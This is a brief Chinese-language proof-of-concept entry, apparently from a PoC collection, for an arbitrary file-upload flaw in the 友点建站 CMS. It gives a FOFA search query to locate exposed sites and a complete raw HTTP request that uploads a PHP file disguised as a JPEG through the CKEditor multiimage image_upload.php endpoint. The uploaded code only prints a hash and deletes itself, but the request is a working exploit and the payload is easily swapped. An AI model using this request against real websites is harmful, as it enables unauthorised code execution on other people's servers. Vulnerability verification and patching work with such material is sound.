## 友点建站系统image_upload.php存在文件上传漏洞


## fofa
```
app="友点建站-CMS"
```


## poc
```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="ceshi.php"
Content-Type: image/jpg
 
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundarydAPjrmyKewWuf59H--
```
![cc46175e2bc4984a6dacff9ec6771b37](https://github.com/wy876/POC/assets/139549762/498ea42c-e9d2-4600-b03e-f59c4f7cfd8d)

![38fb48542afcd1995688e8d030f32750](https://github.com/wy876/POC/assets/139549762/022df476-917d-4ed1-b877-3e2aff0d8611)
